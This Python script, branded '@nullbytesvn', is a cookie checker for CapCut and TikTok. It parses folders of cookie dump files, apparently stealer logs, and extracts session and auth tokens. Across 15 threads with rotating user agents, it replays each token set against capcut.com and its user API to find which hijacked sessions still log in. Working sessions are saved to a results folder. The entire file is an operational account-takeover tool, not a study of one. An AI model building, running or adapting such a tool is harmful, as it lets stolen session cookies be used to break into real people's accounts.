import os
import time
import random
import threading
import hashlib
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

timestamp = datetime.now().strftime("%Y %m %d %H %M %S")

def banner_hien_thi():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[1;35m     @nullbytesvn | t.me/nullbytesvn")
    print("\033[1;36m   ___   _   ___  ___ _   _ _____  ")
    print("\033[1;33m  / __| /_\ | _ \/ __| | | |_   _|   ")
    print("\033[1;32m | (__ / _ \|  _/ (__| |_| | | |   ")
    print("\033[1;31m  \___/_/ \_\_|  \___|\___/  |_|   ")
    print("\033[1;34m                                   ")
    print("\033[0m")

cookie_quan_trong = ['sessionid', 'csrf_token', 'uid', 'sid_tt', 'ssid', 'install_id', 'tt_token', 'auth_token']
cookie_dinh_danh = ['sessionid', 'uid', 'csrf_token']

cookie_hashes = set()
cookie_da_luu = {}
dem_trung = 0
dem_unique = 0
khoa = threading.Lock()

user_agents_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

def tao_session_ngau_nhien():
    session = requests.Session()
    user_agent = random.choice(user_agents_list)
    session.headers.update({
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
    })
    return session

def tao_hash_cookie(cookies):
    cookie_dict = trich_xuat_dict_cookie(cookies)
    chuoi_cookie = ''.join([f"{k}:{cookie_dict.get(k, '')}" for k in sorted(cookie_dinh_danh) if k in cookie_dict])
    return hashlib.md5(chuoi_cookie.encode('utf-8')).hexdigest()

def kiem_tra_trung_cookie(cookies):
    hash_cookie = tao_hash_cookie(cookies)
    with khoa:
        if hash_cookie in cookie_hashes:
            return True, hash_cookie
        else:
            cookie_hashes.add(hash_cookie)
            return False, hash_cookie

def doc_file_cookie_nhanh(duong_dan_file):
    danh_sach_account = []
    account_hien_tai = []
    
    try:
        with open(duong_dan_file, 'r', encoding='utf-8', errors='ignore') as f:
            noi_dung = f.read()
        
        cac_dong = noi_dung.split('\n')
        for dong in cac_dong:
            dong = dong.strip()
            if not dong:
                if account_hien_tai:
                    cookie_da_loc = loc_cookie_quan_trong(account_hien_tai)
                    if cookie_da_loc:
                        danh_sach_account.append(cookie_da_loc)
                    account_hien_tai = []
                continue
                
            if '\t' in dong and not dong.startswith(('URL:', 'PID:', '#')):
                if any(domain in dong for domain in ['.capcut.com', 'capcut.com', '.tiktok.com', 'tiktok.com']):
                    phan_tu = dong.split('\t')
                    if len(phan_tu) >= 7:
                        ten_cookie = phan_tu[5]
                        if ten_cookie in cookie_quan_trong:
                            account_hien_tai.append(dong)
            elif dong.startswith(('URL:', 'PID:')):
                if account_hien_tai:
                    cookie_da_loc = loc_cookie_quan_trong(account_hien_tai)
                    if cookie_da_loc:
                        danh_sach_account.append(cookie_da_loc)
                    account_hien_tai = []
        
        if account_hien_tai:
            cookie_da_loc = loc_cookie_quan_trong(account_hien_tai)
            if cookie_da_loc:
                danh_sach_account.append(cookie_da_loc)
            
    except Exception as e:
        print(f"\033[1;31m❌ Lỗi đọc file: {e}")
        
    return danh_sach_account

def chuyen_doi_sang_dict_cookie(cookies):
    cookie_dict = {}
    for dong_cookie in cookies:
        phan_tu = dong_cookie.split('\t')
        if len(phan_tu) >= 7:
            ten = phan_tu[5]
            if ten in cookie_quan_trong:
                gia_tri = phan_tu[6]
                cookie_dict[ten] = gia_tri
    return cookie_dict

def kiem_tra_tinh_hop_le_cookie(cookies):
    try:
        session = tao_session_ngau_nhien()
        
        cookie_dict = chuyen_doi_sang_dict_cookie(cookies)
        
        if not cookie_dict:
            return False, "Không có cookie hợp lệ"
        
        for ten, gia_tri in cookie_dict.items():
            session.cookies.set(ten, gia_tri, domain='.capcut.com')
        
        response = session.get("https://www.capcut.com/", timeout=10, allow_redirects=True)
        
        if response.status_code != 200:
            return False, f"Lỗi HTTP: {response.status_code}"
        
        noi_dung = response.text.lower()
        
        if any(dau_hieu in noi_dung for dau_hieu in ['my workspace', 'create project', 'template', 'workspace', 'my projects', '/api/user']):
            return True, "Đăng nhập thành công"
        
        if any(dau_hieu in noi_dung for dau_hieu in ['sign in', 'login', 'đăng nhập', 'log in']):
            return False, "Chưa đăng nhập"
        
        try:
            api_response = session.get("https://www.capcut.com/api/user", timeout=5)
            if api_response.status_code == 200:
                data = api_response.json()
                if data.get('user_info') or data.get('user'):
                    return True, "API xác nhận đã login"
        except:
            pass
        
        url_cuoi = response.url.lower()
        if any(trang in url_cuoi for trang in ['login', 'auth', 'signin']):
            return False, "Bị chuyển hướng đến trang đăng nhập"
        
        return False, "Không thể xác định trạng thái"
        
    except requests.exceptions.Timeout:
        return False, "Timeout khi kết nối"
    except requests.exceptions.ConnectionError:
        return False, "Lỗi kết nối"
    except Exception as e:
        return False, f"Lỗi: {str(e)}"

def loc_cookie_quan_trong(cookies):
    danh_sach_cookie_quan_trong = []
    
    for dong_cookie in cookies:
        phan_tu = dong_cookie.split('\t')
        if len(phan_tu) >= 7:
            ten = phan_tu[5]
            if ten in cookie_quan_trong:
                danh_sach_cookie_quan_trong.append(dong_cookie)
    
    return danh_sach_cookie_quan_trong

def trich_xuat_dict_cookie(cookies):
    dict_cookie = {}
    for dong_cookie in cookies:
        phan_tu = dong_cookie.split('\t')
        if len(phan_tu) >= 7:
            ten = phan_tu[5]
            if ten in cookie_quan_trong:
                gia_tri = phan_tu[6]
                dict_cookie[ten] = gia_tri
    return dict_cookie

def kiem_tra_dang_nhap_cookie_song_song(du_lieu_account):
    account_cookies, chi_so_acc, thu_muc_ket_qua = du_lieu_account
    
    bi_trung, hash_cookie = kiem_tra_trung_cookie(account_cookies)
    if bi_trung:
        return "TRUNG", f"Cookie trùng [{hash_cookie[:8]}]", chi_so_acc, account_cookies
    
    try:
        time.sleep(random.uniform(0.1, 0.3))
        
        hop_le, thong_bao = kiem_tra_tinh_hop_le_cookie(account_cookies)
        
        if hop_le:
            return True, "Tài khoản hoạt động", chi_so_acc, account_cookies
        else:
            return False, thong_bao, chi_so_acc, account_cookies
            
    except Exception as e:
        return False, f"Lỗi: {str(e)}", chi_so_acc, account_cookies

def luu_cookie_vao_file(cookies, loai_phat_hien, thu_muc_goc, chi_so_file, hash_cookie):
    duong_dan_thu_muc = os.path.join(thu_muc_goc, "Tai_khoan_hoat_dong")
    os.makedirs(duong_dan_thu_muc, exist_ok=True)
    
    thoi_gian_file = datetime.now().strftime("%H%M%S_%f")[:-3]
    ten_file = f"capcut_{thoi_gian_file}_{hash_cookie[:8]}_{chi_so_file}.txt"
    duong_dan_file = os.path.join(duong_dan_thu_muc, ten_file)
    
    cookie_da_loc = loc_cookie_quan_trong(cookies)
    
    with open(duong_dan_file, 'w', encoding='utf-8') as f:
        for cookie in cookie_da_loc:
            f.write(cookie + '\n')
        
        f.write(f"\n# Dang nhap: THANH CONG - {datetime.now()}\n")
    
    with khoa:
        cookie_da_luu[hash_cookie] = cookie_da_loc
    
    return duong_dan_file, "Tai khoan hoat dong"

def xu_ly_account_song_song(accounts, thu_muc_ket_qua, so_luong_worker=15):
    ket_qua = []
    
    du_lieu_account = [(acc, i+1, thu_muc_ket_qua) for i, acc in enumerate(accounts)]
    
    
    with ThreadPoolExecutor(max_workers=so_luong_worker) as executor:
        future_to_account = {executor.submit(kiem_tra_dang_nhap_cookie_song_song, data): data for data in du_lieu_account}
        
        hoan_thanh = 0
        tong_so = len(du_lieu_account)
        
        for future in as_completed(future_to_account):
            data = future_to_account[future]
            chi_so_acc = data[1]
            
            try:
                loai_ket_qua, thong_bao, idx, cookies = future.result(timeout=15)
                hoan_thanh += 1
                
                if loai_ket_qua == "TRUNG":
                    with khoa:
                        global dem_trung
                        dem_trung += 1
                    print(f"\033[1;33m     🔄 {idx}: TRÙNG COOKIE - {thong_bao} [{hoan_thanh}/{tong_so}]")
                    ket_qua.append(("TRUNG", thong_bao))
                    
                elif loai_ket_qua == True:
                    hash_cookie = tao_hash_cookie(cookies)
                    duong_dan_file, loai_cuoi = luu_cookie_vao_file(cookies, thong_bao, thu_muc_ket_qua, idx, hash_cookie)
                    
                    if duong_dan_file:
                        with khoa:
                            global dem_unique
                            dem_unique += 1
                        
                        so_luong_quan_trong = len(loc_cookie_quan_trong(cookies))
                        print(f"\033[1;32m     ✅ {idx}: TÀI KHOẢN HOẠT ĐỘNG [{so_luong_quan_trong} cookies] [{hash_cookie[:8]}] [{hoan_thanh}/{tong_so}]")
                        ket_qua.append((True, "Tai khoan hoat dong"))
                    else:
                        print(f"\033[1;31m     ❌ {idx}: Lỗi lưu file [{hoan_thanh}/{tong_so}]")
                        ket_qua.append((False, "Loi luu file"))
                else:
                    hien_thi_trang_thai = thong_bao if len(thong_bao) < 30 else thong_bao[:27] + "..."
                    print(f"\033[1;31m     ❌ {idx}: {hien_thi_trang_thai} [{hoan_thanh}/{tong_so}]")
                    ket_qua.append((False, thong_bao))
                
            except Exception as e:
                print(f"\033[1;33m     ⏰ {chi_so_acc}: Timeout [{hoan_thanh}/{tong_so}]")
                ket_qua.append((False, "Timeout"))
                hoan_thanh += 1
    
    return ket_qua

def ham_chinh():
    banner_hien_thi()
    
    thu_muc_cookie = input("\033[1;36mNhập đường dẫn folder chứa file cookie: \033[0m").strip()
    
    if not os.path.exists(thu_muc_cookie):
        print("\033[1;31m❌ Folder không tồn tại!\033[0m")
        return
    
    thu_muc_ket_qua = f"CapCut Working Accounts @nullbytesvn {timestamp}"
    os.makedirs(thu_muc_ket_qua, exist_ok=True)

    cac_file_txt = [f for f in os.listdir(thu_muc_cookie) if f.endswith('.txt')]
    
    if not cac_file_txt:
        print("\033[1;31m❌ Không tìm thấy file .txt nào!\033[0m")
        return
    
    print(f"\033[1;34m📁 Tìm thấy {len(cac_file_txt)} file .txt\033[0m")
    
    tong_account = 0
    tong_working_luu = 0
    thoi_gian_bat_dau = time.time()
    
    for chi_so_file, file_txt in enumerate(cac_file_txt, 1):
        duong_dan_file = os.path.join(thu_muc_cookie, file_txt)
        print(f"\033[1;34m\n🎯 Đang xử lý: {file_txt} ({chi_so_file}/{len(cac_file_txt)})\033[0m")
        
        accounts = doc_file_cookie_nhanh(duong_dan_file)
        
        if not accounts:
            print(f"\033[1;33m   ⚠️ Không tìm thấy cookie quan trọng\033[0m")
            continue
        
        print(f"\033[1;36m   👥 Tìm thấy {len(accounts)} account có cookie quan trọng\033[0m")
        tong_account += len(accounts)
        
        ket_qua = xu_ly_account_song_song(accounts, thu_muc_ket_qua)
        
        file_working_luu = sum(1 for thanh_cong, loai_acc in ket_qua if thanh_cong == True)
        tong_working_luu += file_working_luu
        
        file_trung = sum(1 for loai_ket_qua, _ in ket_qua if loai_ket_qua == "TRUNG")
        print(f"\033[1;35m   📊 {file_txt}: {file_working_luu} Working, {file_trung} trùng\033[0m")
    
    thoi_gian_ket_thuc = time.time()
    tong_thoi_gian = thoi_gian_ket_thuc - thoi_gian_bat_dau
    
    print(f"\033[1;35m{'='*60}\033[0m")
    print(f"\033[1;33m⏱️ Thời gian xử lý: {tong_thoi_gian:.1f}s\033[0m")
    print(f"\033[1;34m📈 Tổng số account: {tong_account}\033[0m")
    print(f"\033[1;32m✅ Working accounts: {tong_working_luu}\033[0m")
    
    if tong_account > 0:
        ty_le_thanh_cong = (tong_working_luu / tong_account) * 100
        ty_le_trung = (dem_trung / tong_account) * 100
        account_moi_giay = tong_account / tong_thoi_gian if tong_thoi_gian > 0 else 0
        
        print(f"\033[1;32m📊 Tỷ lệ thành công: {ty_le_thanh_cong:.1f}%\033[0m")
        print(f"\033[1;33m📊 Tỷ lệ trùng: {ty_le_trung:.1f}%\033[0m")
        print(f"\033[1;35m⚡ Tốc độ: {account_moi_giay:.1f} account/giây\033[0m")
    
    print(f"\n\033[1;36m💾 Kết quả được lưu trong: {thu_muc_ket_qua}\033[0m")
    print(f"\033[1;34m📁 Folder: Tai_khoan_hoat_dong\033[0m")

if __name__ == "__main__":
    banner_hien_thi()
    ham_chinh()